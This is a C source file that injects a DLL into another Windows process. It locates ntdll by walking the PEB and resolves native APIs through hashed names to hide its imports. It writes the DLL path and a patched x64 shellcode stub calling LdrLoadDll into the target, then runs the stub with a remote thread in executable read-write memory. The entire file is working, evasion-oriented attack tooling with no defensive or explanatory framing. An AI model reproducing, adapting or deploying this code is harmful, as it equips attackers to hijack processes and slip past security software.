#include "injection.h"


static DWORD hash_str(const char* s) {
    DWORD h = 5381;
    unsigned char c;
    while ((c = (unsigned char)*s++)) {
        if (c >= 'A' && c <= 'Z') c += 32;
        h = ((h << 5) + h) + c;
    }
    return h;
}


PVOID get_base(HMODULE h) {
    PS_PEB p = (PS_PEB)__readgsqword(0x60);
    PS_LDR l = p->e;
    PS_ENT e1 = (PS_ENT)l->c.Flink;
    PS_ENT e2 = (PS_ENT)e1->b.Flink;
    return e2->d;
}


PVOID resolve(HMODULE h, DWORD target) {
    PBYTE base = (PBYTE)h;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != 0x5A4D) return NULL;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    if (nt->Signature != 0x00004550) return NULL;

    IMAGE_DATA_DIRECTORY exp_dir = nt->OptionalHeader.DataDirectory[0];
    if (exp_dir.VirtualAddress == 0) return NULL;

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(base + exp_dir.VirtualAddress);
    PDWORD names = (PDWORD)(base + exp->AddressOfNames);
    PDWORD funcs = (PDWORD)(base + exp->AddressOfFunctions);
    PWORD ords = (PWORD)(base + exp->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char* name = (char*)(base + names[i]);
        if (hash_str(name) == target) {
            DWORD rva = funcs[ords[i]];
            if (rva >= exp_dir.VirtualAddress && rva < exp_dir.VirtualAddress + exp_dir.Size) {
                return NULL; // Forwarded export
            }
            return (PVOID)(base + rva);
        }
    }
    return NULL;
}


static BYTE stub[] = {
    0x48, 0x31, 0xC9,                   // xor rcx, rcx
    0x48, 0x31, 0xD2,                   // xor rdx, rdx
    0x49, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r8, imm64
    0x49, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r9, imm64
    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, imm64
    0xFF, 0xD0,                         // call rax
    0xC3                                // ret
};


BOOL inject(DWORD pid, LPCWSTR path, SIZE_T size) {
    NTSTATUS st;
    HANDLE h_proc = NULL, h_thr = NULL;
    PVOID r_path = NULL, r_uni = NULL, r_hdl = NULL, r_stub = NULL;
    SIZE_T sz, wr;

    // Resolve APIs
    HMODULE h_ntdll = get_base(NULL);
    F_OPN f_opn = (F_OPN)resolve(h_ntdll, 0x31059255);
    F_ALC f_alc = (F_ALC)resolve(h_ntdll, 0xc66d2fcc);
    F_WRT f_wrt = (F_WRT)resolve(h_ntdll, 0x25801e7a);
    F_THR f_thr = (F_THR)resolve(h_ntdll, 0x81731111);
    F_WAT f_wat = (F_WAT)resolve(h_ntdll, 0x6e7c8b5d);
    F_CLS f_cls = (F_CLS)resolve(h_ntdll, 0x31c2e16a);
    F_FRE f_fre = (F_FRE)resolve(h_ntdll, 0x0c6a2f1b);
    F_LDR f_ldr = (F_LDR)resolve(h_ntdll, 0x329156f3);

    if (!f_opn || !f_alc || !f_wrt || !f_thr || !f_ldr) return FALSE;

    // Open process
    S_CID cid = { (HANDLE)(ULONG_PTR)pid, NULL };
    S_OBJ obj = { sizeof(obj), NULL, NULL, 0, NULL, NULL };
    st = f_opn(&h_proc, 0x1FFFFF, &obj, &cid);
    if (st != 0 || !h_proc) goto CLEAN;

    // Allocate & write DLL path
    sz = size;
    st = f_alc(h_proc, &r_path, 0, &sz, 0x3000, 0x04);
    if (st != 0) goto CLEAN;
    st = f_wrt(h_proc, r_path, (PVOID)path, size, &wr);
    if (st != 0) goto CLEAN;

    // Allocate & write UNICODE_STRING
    sz = sizeof(S_UNI);
    st = f_alc(h_proc, &r_uni, 0, &sz, 0x3000, 0x04);
    if (st != 0) goto CLEAN;
    S_UNI uni = { (USHORT)(size - 2), (USHORT)size, (PWSTR)r_path };
    st = f_wrt(h_proc, r_uni, &uni, sizeof(uni), &wr);
    if (st != 0) goto CLEAN;

    // Allocate DllHandle output
    sz = sizeof(PVOID);
    st = f_alc(h_proc, &r_hdl, 0, &sz, 0x3000, 0x04);
    if (st != 0) goto CLEAN;

    // Patch shellcode
    *(PVOID*)(stub + 8) = r_uni;
    *(PVOID*)(stub + 18) = r_hdl;
    *(PVOID*)(stub + 28) = f_ldr;

    // Allocate & write shellcode
    sz = sizeof(stub);
    st = f_alc(h_proc, &r_stub, 0, &sz, 0x3000, 0x40);
    if (st != 0) goto CLEAN;
    st = f_wrt(h_proc, r_stub, stub, sizeof(stub), &wr);
    if (st != 0) goto CLEAN;

    // Create thread
    st = f_thr(&h_thr, 0x1FFFFF, NULL, h_proc, r_stub, NULL, 0, 0, 0, 0, NULL);
    if (st != 0) goto CLEAN;

    // Wait for thread
    f_wat(h_thr, FALSE, NULL);

CLEAN:
    if (r_stub) { sz = 0; f_fre(h_proc, &r_stub, &sz, 0x8000); }
    if (r_hdl) { sz = 0; f_fre(h_proc, &r_hdl, &sz, 0x8000); }
    if (r_uni) { sz = 0; f_fre(h_proc, &r_uni, &sz, 0x8000); }
    if (r_path) { sz = 0; f_fre(h_proc, &r_path, &sz, 0x8000); }
    if (h_thr) f_cls(h_thr);
    if (h_proc) f_cls(h_proc);

    return (st == 0);
}